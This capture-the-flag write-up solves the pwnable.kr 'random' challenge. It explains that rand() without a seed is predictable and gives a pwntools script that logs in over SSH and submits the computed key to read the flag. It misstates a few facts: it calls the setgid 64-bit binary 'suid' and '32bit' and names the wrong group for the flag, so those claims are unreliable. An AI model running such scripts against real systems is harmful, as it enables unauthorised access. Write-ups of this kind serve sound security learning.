# random Writeup

## Challenge infos

```text
Daddy, teach me how to use random value in programming!

ssh random@pwnable.kr -p2222 (pw:guest)
```

## Server content

```text
--- ls -la ---
total 44
drwxr-x---   5 root random      4096 Apr  5 09:49 .
drwxr-xr-x 118 root root        4096 Jun  1 12:05 ..
d---------   2 root root        4096 Jun 30  2014 .bash_history
-r--r-----   1 root random_pwn    34 Apr  5 09:45 flag
dr-xr-xr-x   2 root root        4096 Aug 20  2014 .irssi
drwxr-xr-x   2 root root        4096 Oct 23  2016 .pwntools-cache
-r-xr-sr-x   1 root random_pwn 16232 Apr  5 09:49 random
-rw-r--r--   1 root root         335 Apr  5 09:49 random.c
--- id ---
uid=1012(random) gid=1012(random) groups=1012(random)
--- cat file---
#include <stdio.h>

int main(){
        unsigned int random;
        random = rand();        // random value!

        unsigned int key=0;
        scanf("%d", &key);

        if( (key ^ random) == 0xcafebabe ){
                printf("Good!\n");
                setregid(getegid(), getegid());
                system("/bin/cat flag");
                return 0;
        }

        printf("Wrong, maybe you should try 2^32 cases.\n");
        return 0;
}

--- file binary ---
random: setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=04c4d602c054138d2b75d9b8d1f00a53165be033, for GNU/Linux 3.2.0, not stripped
```
## Exploitation objective
* The ssh user is ```random```, group ```random```
* The ```flag``` file is readable only by the user ```random_pwn``` or the group ```root```
* The ```random``` binary is a 32bit ELF executable by the ```random_pwn``` user or members of the ```random``` group and is ```suid``` meaning that it executes with the rights of its user even if called by a member of its group

This means that if we pwn the ```random``` executable we can gain read access to the ```flag``` file via suid user ```random_pwn```.

The ```random``` executable is certainly compiled from the ```random.c``` source code, let's have a look.

## C code analysis

```c
        unsigned int random;
        random = rand();        // random value!
```
* The program starts by declaring a variable ```random``` and assigning it a random value using the ```rand()``` function.

```c
        unsigned int key=0;
        scanf("%d", &key);
```

* Then it declares a variable ```key``` and reads an integer value from the user input into it.

```c
        if( (key ^ random) == 0xcafebabe ){
                printf("Good!\n");
                setregid(getegid(), getegid());
                system("/bin/cat flag");
                return 0;
        }
```

* The program then checks if the bitwise XOR of the ```key``` and the ```random``` value is equal to ```0xcafebabe```. If it is, it prints "Good!", changes the group ID to the effective group ID and executes the command ```/bin/cat flag```, which will read the content of the ```flag``` file.

## rand function

* The ```rand()``` function generates a pseudo-random number. The sequence of numbers generated by ```rand()``` is determined by an initial seed value, which is set by the ```srand()``` function. If ```srand()``` is not called, the seed is set to a default value, which means that the sequence of random numbers will be the same every time the program is run.
* In this case, the program does not call ```srand()```, so the sequence of random numbers will be the same every time the program is run. This means that we can predict the value of ```random```.

## Exploitation

* To exploit this program, we need to find a value for ```key``` such that the bitwise XOR of ```key``` and the ```random``` value is equal to ```0xcafebabe```. This can be done by calculating ```key = random ^ 0xcafebabe```.
* Since we can predict the value of ```random```, we can calculate the value of ```key``` that will satisfy the condition.
* Once we have the correct value for ```key```, we can run the program and it will print "Good!", change the group ID to the effective group ID and execute the command ```/bin/cat flag```, which will read the content of the ```flag``` file.
* The content of the ```flag``` file is only readable by the user ```random_pwn``` or the group ```root```, but since the ```random``` binary is suid, it will run with the rights of its user, which is ```random_pwn```, allowing us to read the flag.


## Exploitation script

```python
#!/usr/bin/env python
from pwn import *
```
* Use [pwntools](https://github.com/Gallopsled/pwntools) for automatic exploitation
```python
not_random = 0x6b8b4567

payload = str(not_random ^ 0xcafebabe).encode('utf-8')
```
* Calculate the value of `key` that will satisfy the condition `key ^ random == 0xcafebabe`
```python
server = ssh('random', 'pwnable.kr', 2222, 'guest')
io = server.process(['./random'])

io.sendline(payload)

result = io.recvall()

io.close()
server.close()

print(result)
```
* Connect to the server via SSH using the `random` user and execute the `random` binary
* Send the calculated `key` value to the program
* Read the output of the program, which should include the content of the `flag` file if the exploitation is successful